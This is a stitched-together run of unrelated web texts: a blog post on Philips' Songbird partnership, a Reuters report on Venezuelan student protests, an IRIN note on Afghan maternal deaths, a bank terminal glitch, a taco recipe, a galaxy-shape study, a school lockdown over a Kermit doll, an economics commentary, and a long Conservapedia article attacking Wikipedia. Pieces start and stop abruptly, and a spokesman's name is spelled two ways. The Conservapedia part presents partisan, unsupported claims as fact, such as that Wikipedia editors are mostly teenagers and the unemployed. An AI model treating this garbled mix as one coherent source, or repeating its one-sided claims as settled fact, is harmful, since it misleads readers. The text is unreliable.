It will be Philips - branded , which is understandable , but it will have exclusive features like firmware upgrading that wo n’t be in the regular Songbird release .
The regular Songbird will also work with the GoGear devices , but you wo n’t get firmware upgrading .
In addition , Philips ’ version is Windows - only for now , with a Mac variant in the works .
I ’d say it would ’ve been better if Philips donated the code and specifications to Songbird , so that the original developers can integrate it .
Songbird could create a Device Stage - like experience within their application for third parties to latch on to .
This would prevent fragmentation , while still allowing companies to shove their brands in our faces .
Those are niggles , though .
This is good news for Songbird , and hopefully other manufacturers will follow .
Google , Nokia , Palm – pay attention .
“ Our partnership with Philips is a great step for us – it drives distribution , revenue , and an even tighter connection to the CE side of the world .
Of course the partnership means more features to consider and trade - offs to balance – but in this case , that ’s a great problem to have , ” the Songbird team writes , “ There is lots of overlap in desired features from both sides , so this probably means you ’ll see some things accelerated , which is good news for all Songbird consumers .
I personally never understood why functionality like this could n’t be built into the file manager , so you would n’t need a bloated and slow music management application .
In my ideal world , devices like .mp3 players would follow a standard , where a simple sync button would appear within the file manager .
The file manager would be metadata - aware , so you could just select the albums / songs you ’d want transferred to your device , press sync , et voilÃ .
In a sane world , we would n’t need stuff like iTunes .
In a sane world , operating systems would be designed properly to handle situations like this .
* Police fire gas as Chavez supporters clash with students
* Criticism as government suspends popular cable network ( Adds more protests , US and government comment )
CARACAS , Jan 25 ( Reuters ) - Police used tear gas to disperse thousands of students who marched in Venezuelan cities on Monday to protest the government ’s widely criticized suspension of a TV station opposed to President Hugo Chavez .
Venezuelan cable providers , responding to government orders , stopped showing RCTV Internacional on Sunday .
The station is critical of Chavez , who pushed its parent RCTV off free - access television in 2007 .
The new suspension of RCTV , along with some other small stations , was criticized by media freedom groups and the U.S. government .
“ Any time the government shuts down an independent network , that is an area of concern , ” U.S. State Department spokesman Philip Crawley said .
Venezuela said Crowley “ lied ” when he said the stations had been closed , and that the suspension could be reversed if they comply with a new law requiring them to broadcast some of Chavez ’s speeches , among other things .
“ This is not an attack on the freedom of expression , it is an administrative sanction under the law , ” Bernardo Alvarez , Venezuela ’s ambassador to Washington , told Reuters .
He said the suspension was not politically motivated .
Students from universities and schools in the capital marched with their hands painted white and tried to reach the offices of the government media regulator .
They were repelled by a small group of Chavez supporters and then chased off by police in riot gear who fired tear gas after a rock was thrown .
In other cities some students were injured in clashes with the police and arrests were made , local media reported .
PRESIDENT’S MOUNTING PROBLEMS
The students chanted the slogan “ 1,2,3 , Chavez you struck out , ” in reference to the president ’s mounting problems in the baseball - mad nation with issues ranging from water and electricity shortages to an unpopular currency devaluation .
“ We are here because of the violation of freedom of expression , ” said 17 - year - old medical student Yanuan Pedraza .
“ This is the second time they have closed RCTV . ”
Chavez in 2007 denied RCTV a renewal of its broadcast license , accusing the station of participating in a 2002 coup .
During the coup , the network showed nonstop footage of anti-Chavez protests leading up to his brief ouster but turned cameras off when loyalists restored him .
The 2007 move against RCTV triggered large student - led protests that snowballed throughout the year and are widely seen as a factor in Chavez ’s first - ever ballot box defeat in a referendum on allowing him to run again for office .
He later won another referendum on the same issue .
The station soon reappeared on cable and continued its anti-government line and menu of popular soap operas .
“ This move , condemned by the Inter - American Commission on Human Rights , reveals yet again the government ’s allergic reaction to dissident voices within the country ’s leading broadcast media , ” Reporter Without Borders said on Monday .
The Organization of American States ’ Secretary General Jose Miguel Insulza said he “ lamented the situation ” regarding the removal from the air of the stations and called on the government to allow the OAS to visit the country .
Chavez has boosted pro-government broadcasting in recent years by creating several state - funded television networks including the Telesur channel , meant to be a Latin American leftist counterpart to CNN .

One of the most risky places in the world for a woman in pregnancy or childbirth is Afghanistan .
An Afghan woman is 225 times more likely to die in childbirth than a woman in the UK , for example .
There is hardly a family in Afghanistan that has not been touched by a tragic experience associated with childbirth .
In Veil of Tears , a 60 - page colour booklet launched today , IRIN brings you a unique collection of personal stories of loss and courage in childbirth , as told by women , men and children from different parts of Afghanistan .
The stories were originally recorded in local languages , Dari and Pashto , for IRIN Radio broadcasts .
Transcribed into English in Veil of Tears , they convey the immediacy and intimacy of the interviews conducted by IRIN reporters , who travelled in some cases for several days to reach the remotest villages in Afghanistan .
The testimonies in Veil of Tears offer some rarely reported perspectives on the issue of maternal mortality and as a compilation tell much about the state of today ’s Afghanistan in the words of some of its most ordinary citizens .
The interviewees in the booklet talk about the struggle to get enough nutritious food to sustain a woman through pregnancy , and to feed their families on any given day ; they describe the awesome distances and terrain that separate people living in the villages from the nearest health facility ; they describe the lack of proper roads and transport that may leave a donkey cart as the only option to attempt a life - or - death journey with a pregnant wife or mother to a hospital ; they explain the cultural and social rules that might mean decisions by men are made too late to save a woman and her baby .
Fact Box
One in eight Afghan women will probably die in childbirth
An Afghan woman is 225 times more likely to die in childbirth than a woman in UK
Only 25 % of Afghan births are assisted by a skilled birth attendant
Fewer than 13,000 health workers serve an Afghan population of 28 million

Retail businesses across the country have lost thousands of dollars over the long weekend because a computer glitch left shoppers unable to use the Bank of Queensland ’s Eftpos terminals .
BOQ ’s Eftpos machines skipped ahead six years when the clock ticked over to January 1 and started date stamping January 2016 .
BOQ staff have not been able find what caused the problem , but a temporary solution has been put in place to ease retailers ’ frustrations .
The glitch cost businesses untold amounts as the Eftpos terminals read customers ’ cards as having expired and refused their transactions .
Barry Jones , owner of Sharky ’s T - shirt and souvenir store in Cairns , said his business was without an Eftpos machine for two days .
Tacos Al Pastor is one of my favorite Mexicans foods .
They are tacos filled with grilled pork , pineapple , and cilantro relish .
I had never heard of these until a couple days ago when I came across a recipe and just had to give them a try .
They were a huge success and I will be making them frequently .
The pork gets marinated in an orange juice / pineapple mixture .
This helps to tenderize the meat .
I felt the flavor of the pork , pineapple and cilantro relish all went together extremely well .
I also decided to add some shredded Monterey jack cheese to my tacos .
The tacos also go great with different types of salsas .
If you do not have a grill this could all be done using a grill pan or even a skillet .
Enjoy .

For the first time , two astronomers have explained the diversity of galaxy shapes seen in the universe .
The scientists , Dr Andrew Benson of the California Institute of Technology ( Caltech ) and Dr Nick Devereux of Embry - Riddle University in Arizona , tracked the evolution of galaxies over thirteen billion years from the early Universe to the present day .
Their results appear in the journal Monthly Notices of the Royal Astronomical Society .
Galaxies are the collections of stars , planets , gas and dust that make up most of the visible component of the cosmos .
The smallest have a few million and the largest as many as a million million ( a trillion ) stars .
American astronomer Edwin Hubble first developed a taxonomy for galaxies in the 1930s that has since become known as the ' Hubble Sequence ' .
There are three basic shapes : spiral , where arms of material wind out in a disk from a small central bulge , barred spirals , where the arms wind out in a disk from a larger bar of material and elliptical , where the galaxy 's stars are distributed more evenly in a bulge without arms or disk .
For comparison , the galaxy we live in , the Milky Way , has between two and four hundred thousand million stars and is classified as a barred spiral .
Explaining the Hubble Sequence is complex .
The different types clearly result from different evolutionary paths but until now a detailed explanation has eluded scientists .
Benson and Devereux combined data from the infrared Two Micron All Sky Survey ( 2MASS ) with their sophisticated GALFORM computer model to reproduce the evolutionary history of the Universe over thirteen billion years .
To their surprise , their computations reproduced not only the different galaxy shapes but also their relative numbers .
" We were completely astonished that our model predicted both the abundance and diversity of galaxy types so precisely , " said Devereux .
" It really boosts my confidence in the model , " added Benson .
The astronomers ' model is underpinned by and endorses the ' Lambda Cold Dark Matter ' model of the Universe .
Here ' Lambda ' is the mysterious ' dark energy ' component believed to make up about 72 % of the cosmos , with cold dark matter making up another 23 % .
Just 4 % of the Universe consists of the familiar visible or ' baryonic ' matter that makes up the stars and planets of which galaxies are comprised .
Galaxies are thought to be embedded in very large haloes of dark matter and Benson and Devereux believe these to be crucial to their evolution .
Their model suggests that the number of mergers between these haloes and their galaxies drives the final outcome -- elliptical galaxies result from multiple mergers whereas disk galaxies have seen none at all .
Our Milky
Way galaxy 's barred spiral shape suggests it has seen a complex evolutionary history , with only a few minor collisions and at least one episode where the inner disk collapsed to form the large central bar .
" These new findings set a clear direction for future research .
Our goal now is to compare the model predictions with observations of more distant galaxies seen in images obtained with the Hubble and those of the soon to be launched James Webb Space Telescope ( JWST ) , " said Devereux .

Current thread :
Peak to Peak Charter School in Lafayette was closed Wednesday morning after a large duffel bag containing a Kermit the Frog — which appeared to have blood stains on it — was found on the west side of the campus .
An employee of the school called police at about 7:15 a.m. after discovering the suspicious package in Peak to Peak ’s otherwise - empty parking lot , according to Lafayette police Cmdr. Mark Battersby .
Police secured a perimeter around the school , and students and staff members who had already arrived at Peak to Peak were locked down in a building on the east side of the campus while investigators checked the duffel .
Using a robot equipped with movable arms and a camera , members of Boulder County ’s bomb squad were able to examine the items that were inside the duffel bag– including the Kermit the Frog doll — at a safe distance .
An officer then made a final inspection of the abandoned items in person to make sure everything was “ absolutely safe , ” Battersby said .
The school was cleared just before 10 a.m. , but Peak to Peak remained closed for the day since many of the students did not make it to the campus before police blocked access .
“ We ’re always glad when this type of situation turns out not to be a dangerous situation , ” said Briggs Gamblin , a spokesman for the Boulder Valley School District .
“ But we believe our parent community — whether at a regular school or a charter school — expects us to treat each incident seriously . ”
Alicia Thomas , the mother of four Peak to Peak students , said that while one of her daughters believes the mysterious Muppet might have been part of a senior prank , she applauds the careful approach .
“ I ’d much rather be cautious and miss a day of school than have someone ( at Peak to Peak ) trying to decide if it ’s a prank or not , ” she said .
“ I think that if we do n’t have people taking those steps , stuff will happen . ”

U.S. GDP in the last three months of 2009 soared by 5.7 % .
That 's good news , but the number does n't tell the whole story .
Dan digs into the figure to find out what 's growing and what is n't , but to get a more complete picture of our economic growth , check out the Chicago Fed National Activity Index ( NAI ) -- what Barry Ritholz calls " the best economic indicator you 've never heard of . "
The newest NAI report on 2009 's fourth quarter is out , and it 's not as sanguine as GDP .
Here 's the chart :
What 's happening here ?
The short version is this :
The economy started to rally dramatically last summer , but the recovery has stalled since September .
Here 's the longer , more informative version .
NAI tracks 85 economic indicators , which lumped into four big categories : production and income ( P&I ) ; employment , unemployment , and hours ( EU&H ) ; personal consumption and housing ( C&H ) ; and sales , orders , and inventories ( SO&I ) .
The graph below explains how these categories performed in the second half of 2009 .
Some lessons from this chart : Production has been positive for six months .
Employment continues to languish .
This should n't surprise us .
Not only does GDP improve faster than employment , but also Larry Summers admitted to the New Yorker that the stimulus plan specifically targeted production over jobs .
( Megan will have more on the prospects of a jobless recovery later today .... )
From Conservapedia
The multilingual Wikipedia home page
Wikipedia is an online wiki - based encyclopedia hosted and owned by the non-profit organization Wikimedia Foundation and financially supported by grants from left - leaning foundations plus an aggressive annual online fundraising drive .
[ 1 ]
Most of Wikipedia 's articles can be edited publicly by both registered and anonymous editors , [ 2 ] mostly consisting of teenagers and the unemployed .
[ 3 ]
As such , it tends to project a liberal — and , in some cases , even socialist , Communist , and Nazi- sympathising — worldview , which is totally at odds with conservative reality and rationality .
Wikipedia was co-founded by Jimbo Wales ( an atheist , libertarian , and objectivist ) , and philosophy professor Larry Sanger in 2001 .
The website was originally created to complement the now - defunct peer - reviewed online encyclopedia Nupedia as a way for collaboration on articles .
However , Wikipedia overtook Nupedia and became an independent project hosted by the Wikimedia Foundation , which also hosts various related websites , known as " sister projects " , such as Wikinews and Wikibooks .
Co-founder Larry Sanger later acknowledged that Wikipedia does not follow its own neutrality policy . [ 4 ]
Critics of Wikipedia state that Wikipedia 's articles contain systemic bias , [ 5 ] and that the information included within its articles are a mixture of truths , half - truths , and falsehoods .
[ 6 ]
The nature of Wikipedia also makes it subject to spin and bias , examples of which include paid public relations advocacy and inserting libelous content into the biographies of politicians for a political purpose . [ 6 ]
Wikipedia was also criticized for having a liberal bias in its articles about politics , despite Wikipedia 's " neutral point of view " policy . [ 5 ]
Continuing loss of influence
Wikipedia 's traffic level stems from its high placement in Google searches , and that many people rely upon it for quick research regarding trivial facts .
However , users are turning to alternatives such as the voice - based iPhone application Siri or the Knowledge Graph display on Google search result pages of key facts about search targets .
[ 7 ]
Wikipedia page - views dropped by 2 billion between December 2012 and December 2013 .
Wikipedia 's most popular versions are leading the decline : page - views of the English Wikipedia dropped by 12 percent , those of German version slid by 17 percent and the Japanese version lost 9 percent . [ 7 ]
In addition to the number of visitors declining , there continues to be a drop in active editors as well .
In August 2012 , it was reported that Wikipedia has a shrinking base of editors . [ 8 ]
At the same time , Business Insider indicated Quora was " Wikipedia 's worst nightmare " . [ 9 ]
Unreliability of Wikipedia
Wikipedia relies on self - selected " editors " to write and compile articles , with no preference given for scholars in the fields about which they are writing .
This fact may disqualify Wikipedia from being considered a genuine encyclopedia , ironically even by its own standards .
An encyclopedia is supposed to be a collection of articles by " well - educated , well - informed content experts . " [ 10 ]
Theoretically , Wikipedia is supposed to compensate for this weakness by requiring references to reputable secondary sources .
But editors can delete , without collaboration , any text or entry they dislike , citing one of the many Wikipedia guidelines for doing so .
Entries posted by scholars in the field , based on peer - reviewed , academic articles are deleted by editors with an ideological bias .
Wikipedia , then , only represents the majority view of its editors .
As the contribution of volunteer editors has declined , some of the void has been replaced by paid public relations professionals .
These paid editors seek to present their client companies or individuals in the best possible light .
This has resulted in many articles being transformed into paid advertising pieces that take advantage of the English Wikipedia 's high placement on Google search results .
This chronic problem has become so severe that the Wikimedia Foundation has proposed amending its terms of service to require disclosures of paid editing conflicts of interest . [ 11 ]
In the competition to control content , the paid PR editors win out because they are monitoring pages as a full - time job , while editors seeking to keep content more balanced are only part - time volunteers .
In 2008 , the American Journalism Review declared concerning Wikipedia :
“ " An even more blunt assessment appears in the encyclopedia 's " Ten things you may not know about Wikipedia " posting : " We do not expect you to trust us .
It is in the nature of an ever - changing work like Wikipedia that , while some articles are of the highest quality of scholarship , others are admittedly complete rubbish . "
It also reminds users not to use Wikipedia as a primary source or for making " critical decisions . " [ 12 ] ”
Despite its official " neutrality policy , " Wikipedia has a strong liberal bias .
In an article entitled " Wikipedia Lies , Slander Continue , " journalist Joseph Farah stated Wikipedia " is not only a provider of inaccuracy and bias .
It is a wholesale purveyor of lies and slander unlike any other the world has ever known . " [ 13 ]
Mr. Farah has repeatedly been the victim of defamation on Wikipedia . [ 13 ]
In December 2010 , Christian apologist JP Holding called Wikipedia " the abomination that causes misinformation " . [ 14 ]
Some say that Wikipedia 's unreliability is systemic , citing Douglas Adams : " In other words — and this is the rock - solid principle on which the whole of the Corporation ’s Galaxywide success is founded — their fundamental design flaws are completely hidden by their superficial design flaws .
Wikipedia , which is written by anyone , still struggles to solve the need for traditional quality controls characteristic of conventional encyclopedias .
The self - policing practices have produced results and accuracy some claim is far better than originally expected but still widely questioned .
Research released in April 2012 claimed 60 % of Wikipedia articles contain " inaccuracies " , leading the Daily Mail to dub it " Iffy - Pedia " . [ 15 ]
The lack of consistency and uniform supervision leaves an ever - present shadow over any given piece of information .
Many in the academy insist that it is an unreliable source for research and an unacceptable reference in many classrooms .
However , Wikipedia steers people to original source material , and with the use of hyperlinks and search engines , it has become the most widely used intermediary reference tool on the Internet .
According to the style manual for the Associated Press , the largest news agency in the United States , Wikipedia should not be used as a primary source , but the hyperlinks in articles may be helpful as sources .
Wikipedia has millions of entries on trivia and mundane topics ranging from an explanation for " duh " [ 16 ] to singles by obscure rock bands [ 17 ] to arcane British nobility . [ 18 ]
There are editions of Wikipedia in 250 languages , and 130 have more than 1000 articles . [ 19 ]
After about four years Wikipedia had about 450,000 entries , [ 20 ] and after six years it had about 1.7 million entries . [ 21 ]
Four years later this number had more than doubled again : in November 2011 , there were more than 3.8 million content pages . [ 22 ]
As of February 2014 , there are more than 4.4 million " content " pages , many of which lack educational value .
On important topics , the information is often misleading due to the unchecked , systematic liberal bias that dominates Wikipedia .
The quality of Wikipedia articles can vary greatly .
Some articles , particularly about narrow topics and those of little interest , are well written and appear to have input from one or more subject matter experts .
Articles about broader topics and with high viewership naturally have more editors , many of whom are not well versed in the subject matter .
In determining the quality of an article it is helpful to check the sources or references to see if one or more of the standard references for the topic is frequently cited .
Often the most valuable feature of an article will be to direct the reader to good quality references , if they exist .
Origins
Initially , Wikipedia was hosted on servers operated by Bomis , Inc. , a company that also sold pornographic pictures . [ 23 ]
The majority owner of Bomis had lost his fortune in a lawsuit , and the Wikipedia volunteers feared that if all of Bomis ' assets were seized , ownership of Wikipedia would be transferred .
In 2003 , Jimbo Wales addressed this risk by founding the Wikimedia Foundation to take control of Wikipedia 's assets .
The Wikimedia Foundation is a non-profit organization that provides support for Wikipedia and other similar projects , [ 24 ] and also the free MediaWiki software that runs Wikipedia and Conservapedia . [ 25 ]
It also gives out millions of dollars in grants each year to liberal causes that recruit liberals to edit Wikipedia so as to reflect their biases .
Leftist bias
See also : Leftist roots of Wikipedia
See also : Examples of Bias in Wikipedia
Wikipedia shows a systematic bias in the proportion of articles which treat controversial issues .
It ignores its own NPOV policy when it allows contributors to " delete well - referenced information " merely because it comes from a scientist who holds a minority view .
It would only be a violation , if the article used the information to give a false impression of the proportion of scientists adhering to that view , but liberals use " undue weight " like a sledge hammer .
They are either unaware or unconcerned about their bias .
This is not surprising , given this Zogby poll :
While 97 % of Republicans surveyed said the media are liberal , two - thirds of political independents feel the same , but fewer than one in four independents ( 23 % ) said they saw a " conservative bias " .
Democrats , while much more likely to perceive a conservative bias than other groups , were not nearly as sure the media was against them as were the Republicans .
While Republicans were unified in their perception of a left - wing media , just two - thirds of Democrats were certain the media skewed right – and 17 % said the bias favored the left . [ 26 ]
David Swindle writes at FrontPage Magazine :
“ There was not a single ideological vision driving Wikipedia ’s founders and core contributors as they launched the project .
Jimmy Wales , who would become the face of the project and its “ benevolent dictator , ” according to Andrew Lih ’s The Wikipedia Revolution​ , is a libertarian and Ayn Rand​ian Objectivist .
Also important in shaping Wikipedia was the so - called “ hacker ethos , ” the culture that has developed amongst computer programmers over the last 40 years and been shaped by the Left , the counterculture , popular culture , and anarchist thought .
What binds together these ideologies is a utopian ideal that human beings are more prone to altruism rather than self - interest .
In Wikipedia Revolution Wales is quoted as saying , “ Generally we find most people out there on the internet are good …
It ’s one of the wonderful humanitarian discoveries in Wikipedia , that most people only want to help us and build this free nonprofit , charitable resource . ”
Ward Cunningham was the programmer who created the wiki concept and software .
According to Lih , he believed in the Wiki because “ People are generally good . ”
Lih explains how this philosophy is embedded within Wikipedia ’s rules : A core idea Wikipedia embraced .. was to assume good faith when interacting with others .
The guideline promoted optimistic production rather than pessimistic nay - saying , and reads , “ Unless there is strong evidence to the contrary , assume that people who work on the project are trying to help it , not hurt it ; avoid accusing others of harmful motives without particularly strong evidence .
But as it worked out , Wikipedia in practice has strayed from these utopian ideas because of the ease with which political and social bias trumps altruism .
After almost a decade of rapid growth and free - wheeling experimentation the situation at the site by the Summer of 2009 was chaos .
Political operatives would sabotage one another in electoral contests by vandalizing pages .
More malicious misinformation filtered in freely , with living historical figures accused of involvement in conspiratorial plots . [ 27 ] ”
Wikipedia co-founder Larry Sanger , who left the site , later acknowledged that Wikipedia does not follow its own neutrality policy . [ 4 ]
Wikipedia also has an automatic Wikimedia Commons editing software called " Commonist , " which allows the user to upload multiple files at once .
The symbol of communism - the " hammer and sickle " of the leftist ideology which murdered millions in the former Soviet Union - is featured prominently on the instruction page as well as the tags that mark each uploaded image . [ 29 ]
Research
On August 23 , 2011 , David Swindle published an article at FrontPage Magazine detailing how Wikipedia has been taken over by the political left and he cited statistics relating to Wikipedia 's articles on Anne Coulter , Michael Moore , Glenn Beck and Keith Olbermann which helped demonstrate the Wikipedia has a leftist / liberal bias plus he discussed the liberal / leftist cultural foundations of Wikipedia . [ 30 ]
For example , Swindle wrote :
" Consider Ann Coulter versus Michael Moore​ .
Coulter ’s entry ( on August 9 , 2011 ) was 9028 words long . *
Of this longer - than - usual entry , 3220 words were devoted to “ Controversies and criticism ” in which a series of incidents involving Coulter and quotes from her are cited with accompanying condemnations , primarily from her opponents on the Left .
That ’s 35.6 percent of Coulter ’s entry devoted to making her look bad .
By contrast , Moore ’s entry is 2876 words ( the more standard length for entries on political commentators ) , with 130 devoted to “ Controversy . ”
That ’s 4.5 % of the word count , a fraction of Coulter ’s .
Does this mean that an “ unbiased ” commentator would find Coulter eight times as “ controversial ” as Moore ? " [ 30 ]
Talk Pages
A lot of Wikipedia 's leftist bias is clearly evident from their talk pages .
For example , when an article about the Barcelona May Days [ 31 ] ( an event during the Spanish Civil War where hundreds of anti-Stalinist Trotskyists and anarchists were gunned down by the pro-Stalin Republican government ) portrayed the anti-Stalinist side , which contained author George Orwell , in a generally favourable light , Stalinists filled the talk page with childish attacks on the authors of the article , including expletives , as is characteristic of Wikipedia .
Purported " Tertiary " Source and Arbitrary Standards
Wikipedia purports to be a " tertiary " source , relying on edited work from reputable sources .
The policy is meant to build on the work of qualified editors of secondary sources .
Some accuse Wikipedia , therefore , of relying on hearsay , and discouraging the application of logic and new development of new insights .
The result is an agglomeration of reheated " consensus " with little or no intellectual merit of its own ; in particular , it is impossible to challenge orthodoxy , received wisdom or commonly held misconceptions through the Wikipedia system , no matter how factually incorrect those orthodoxies might be .
Supporters of Wikipedia would claim that relying on secondary sources encourages reliability and objectivity .
However , there are cases of Wikipedia applying it 's standards arbitrarily .
For example , the case of Wikipedia editor " Yeoberry " ( user ID 3606936 ) , an editor with a Ph.D. in church history who first posted materials about " Icons " on August 6 , 2012 , with multiple citations to historical documents .
The material was removed and Yeoberry was told that Wikipedia is a " tertiary " source and so he needed to find reliable secondary sources .
On April 4 , 2013 , Yeoberry again added largely the same material , this time citing a newly published academic paper in a peer - reviewed journal .
The information was again removed , with editors , at least some of whom religiously affiliated with the organization supporting icons , claiming the editor had a " COI " ( conflict of interest ) .
Neither time did the editors removing Yeoberry 's material consult Yeoberry .
But when Yeoberry reverted to his edition , he was charged with " edit warring . "
When Yeoberry challenged the arbitrary use of Wikipedia criteria he was blocked from editing indefinitely and then his access to his own talk page was also blocked . [ 32 ]
Wikipedia articles , especially on controversial or political and religious topics , are often guarded by editors who have an interest in slanting the content of the article , may have no formal education on the topic , and can find a so - called reason for suppressing the information they want to suppress .
Editors can claim the source is unreliable ( as they interpret that ) ; that information gives " UNDUE " weight to the topic the information is about ; peer - reviewed , academic articles written by scholars can be removed by editors if , in the opinion of an editor , the view expressed is " Fringe " or if the contributor has a " COI " ( conflict of interest ) if he 's the author of the secondary source or has an advanced education or other interest in the topic ; etc .
Editors with advanced education in a topic , citing sources from peer - reviewed journals , can have their contributions deleted and their participation prohibited if a few other editors , without such qualification but with enough knowledge of the Wikipedia jargon , decide to suppress him or her .
Originally , encyclopedias were written by scholars , either by one or a few whose knowledge is considered " encyclopedic " ( i.e. very broad ) or each article is written by an expert in the field .
But in Wikipedia , expertise in a given field can disqualify one from contributing in that field resulting in Wikipedia being accused of being a " idiocracy " .
Economics
Though Wikipedia is non-profit , the Wikia project of its co-founder is very much for - profit and has raised millions of dollars in venture capital .
Already Wikipedia has been criticized for favoring Wikia .
When Wikipedia community voted 61 - 39 % percent to treat all links to other sites equally by removing nofollow ( Google - ignored ) tags for all of them , the Wikipedia co-founder overruled this decision and Wikipedia now favors Wikia in its treatment of nofollow tags . [ 33 ] [ 34 ]
The Register said : [ 3 ]
Wikipedia has tried to balance the Utopian goal of " an encyclopedia anyone can edit " with the more utilitarian goal of " a website anyone would want to read " .
With over a million articles , and a rulebook almost as dense , Wikipedia has demonstrated an insatiable desire to participate , create lists and generate procedures .
The result is a huge silo of recorded trivia , and perhaps the world 's largest , most distributed bureaucracy - mostly manned by a casual staff of teenagers and the unemployed .
For the past few years , Wikipedia has added banners begging for money from its viewers .
The site claims to be in need of more funding , but in fact it is " awash with cash - and raises far more money each year than it needs to keep operating . " [ 35 ]
Wikipedia , a registered trademark of Wikimedia Foundation , is used also by services like WikiExperts.us , which is declared as not being affiliated with it .
WikiExperts.us accepts money to write Wikipedia entries for businesses and is included in American business ventures of Alex Konanykhin , the Former Russian oligarch , who has been wanted in Russia since Yeltsin 's days to face charges relating to embezzlement and financial fraud . [ 36 ]
Scandals and decline
[ 37 ]
Graph courtesy Decline in Wikimedia Foundation donations .

Used with Permission .
The cumulative effect of multiple scandals and revelations has led to declining activity on the English Wikipedia .
The rate of new account creation peaked in early 2007 and has declined ~ 30 % since .
Overall editing activity showed a steady decline beginning in February 2007 .
An independent analysis reported , " The rate at which edits were being made to Wikipedia articles appears to have peaked in February to April 2007 and declined since .
This decline is unprecedented in Wikipedia 's history ....
Though it may be purely coincidental , this time frame also corresponds to the Essjay controversy appearing in the press . "
Even after the hoax was revealed of high level intimates promoted by the Wikimedia Foundation as experts in fields that they were not , to persuade college professors to allow students to cite Wikipedia as a reliable source , and entrusted with the ability to invade users privacy which could affect , in their words , " life and death , " Wikipedia still appealed to students with a Jim and Tammy Faye Baker - style fundraising slogan across one million project space pages that read , " OMG !
Wikipedia is gone !
I ’ll flunk my exams ! " [ 6 ]
Further evidence of the decline in Wikipedia is that the number of editors who voted in the 2012 Arbitration Committee elections has dropped to 858 . [ 39 ]
For a website that claims to have thousands of active editors , this is very low .
Active editors are discouraged from voting because all voters are subject to automatic investigation and invasion of their privacy to determine if they are " sockpuppets " of other voters . [ 40 ]
Shane Fitzgerald Hoax
After the death of composer Maurice Jarre , a Wikipedia editor named Shane Fitzgerald attached a quote to Jarre 's page : " One could say my life itself has been one long soundtrack .
Music was my life , music brought me to life , and music is how I will be remembered long after I leave this life .
When I die there will be a final waltz playing in my head , that only I can hear . " [ 41 ]
The words are poetic , yet were never spoken by Jarre , and meant to appeal to news journalists seeking information .
It was cited in many newspapers as a genuine quote before its removal . [ 42 ]
Had Fitzgerald not confessed to the lie and informed major newspapers , it is likely that the quote would have been cited to one of them .
In the days following , only one newspaper ( The Guardian ) publicly apologized for the use of a source that can be a tool for duping the public . [ 43 ]
Other newspapers , such as the Washington Post , simply deleted their articles from online archives .
False claim about Brent Bozell
In March 2007 , Brent Bozell described this falsehood in Wikipedia : [ 44 ]
The other day , Bernie Goldberg emailed me , upset .
He pointed me to his Wikipedia entry .
To read what was written was to conclude that apparently I must hate his guts .
But we are friends .
He is a man for whom I have profound respect , professional and personal .
He knew there was foul play .
Right there on the screen , under the heading " Criticism , " it stated that I had attacked him , " claiming that Goldberg merely lifted material he had been producing for years , and only published the book because he had an ax to grind with his former employers and was attempting to make a ' quick buck , ' noting that Goldberg never mentioned the alleged liberal bias of the media until it was ' convenient ' and ' profitable ' for him to do so . " ...
In fact , those words have never been uttered by me .
The accusation would be false .
Back in 1996 , Goldberg used the op - ed pages of The Wall Street Journal publicly to castigate his own network for its one - sided oafish bashing of Steve Forbes .
It was anything but " convenient " or " profitable " for him .
It ruined his friendship with Dan Rather and put him on a path to the outer fringes of CBS News .
Ultimately , it ruined his newscaster career .
My attorney contacted Wikipedia by email demanding the removal of this false entry .
No response .
So we edited out the offensive material ourselves , after which in writing counsel alerted Wikipedia to the legal action that might befall them should this be repeated .
Here 's full disclosure , Wikipedia - style :
You can see how each article is altered , sometimes hour by hour , in its " History " section .
But there is no mention of the attorney 's complaints .
In the Goldberg article 's history , an editor simply now scolds : " Bozell 's article is a mock - jealous swipe at Goldberg 's opportunism .
PLEASE REREAD IT . "
( Capitals theirs . )
Goldberg and I are not alone .
The website Conservapedia.com has a long list of 41 allegations of bias and factual errors at Wikipedia .
You can add to that the problem with the credentials of its staff .
One of its editors , named only " Essjay " online and described on his user profile " as a tenured professor of religion at a private university with expertise in canon law , " was recently exposed as a 24 - year - old college kid in Kentucky .
He resigned in disgrace — even though Wikipedia tried to retain him , claiming he 'd edited thousands of articles with flair .
Instead of apologizing to Brent Bozell , Wikipedia instead says " Bozell points to Conservapedia as a resource that documents Wikipedia 's faults in this regard , presumably holding it as a more authoritative reference less vulnerable to vandalism . " [ 45 ]
Rewriting its own history
The Associated Press and others credit Larry Sanger as the co-founder of Wikipedia . [ 46 ]
But the Associated Press quotes Jimmy Wales as denying it : [ 47 ]
" When you write this up please do not uncritically repeat Sanger 's absurd claim to be the co-founder of Wikipedia . "
" I know of no one who was there at the company at the beginning who would think it anything other than laughable , " he added .
This is an interesting comment , considering that Larry Sanger takes credit for coining the name , " Wikipedia . " [ 48 ]
" I am not bent out of shape about it , " he wrote .
" The facts are on my side , which is why I bother so little about it . "
According to the Associated Press , Jimmy Wales " has repeatedly tried to address this - even going so far as editing his own Wikipedia biography to tone down credit for Sanger .
Such autobiographical contributions are frowned upon in Wikipedia 's community , and Wales apologized after his changes were noticed and publicized by blogger Rogers Cadenhead in 2005 . " [ 49 ]
Wales ' booking agent for speaking engagements claims that Wales is " the founder " of Wikipedia , which results in surprised clients when that claim is challenged .
The false " founder " claim is on Wales ' webpage . [ 50 ]
Jimmy Wales has admitted that certain administrators , contrary to their own rules , have at times completely removed editing evidence .
Seigenthaler scandal
In early October 2005 , a prominent and respected journalist John Seigenthaler Sr. , contacted Wikipedia founder Jimmy Wales about false and libelous content in his biographical entry .
Essjay , a 24 - year - old Wikipedia Administrator who was advancing rapidly in the organization , was dispatched to handle the situation . [ 51 ]
An anonymous contributor added to Seigenthaler 's biography the previous May ,
" John Seigenthaler Sr. was the assistant to Attorney General Robert Kennedy in the early 1960s .
For a short time , he was thought to have been directly involved in the Kennedy assassinations of both John , and his brother , Bobby .
Nothing was ever proven , " and " John Seigenthaler moved to the Soviet Union in 1971 , and returned to the United States in 1984 .
He started one of the country 's largest public relations firms shortly thereafter . "
Wales told Seigenthaler that Wikipedia is " accountable " and corrects mistakes immediately , but that the internet service provider of the anonymous user probably would not be helpful in identifying who placed the content . [ 52 ]
Accountability activist Daniel Brandt , a victim of a spurious biographical entry by Wikipedia Administrators , identified the place of employment of the anonymous user , and from there the person accountable was identified . [ 53 ]
Seigenthaler returned to the editorial pages of USA Today from which he retired as its first editorial manager to write an Op - Ed piece critical of Wikipedia and the threat it poses to free speech due of its overt provocation of government regulation , its irresponsible self - regulation and lack of accountability . [ 54 ]
CNN interview
On December 5 , 2005 Wales and Seigenthaler appeared on CNN .
An exchange between CNN moderator Kyra Phillips and Wales went like this :
“ PHILLIPS : ... I ran my name .
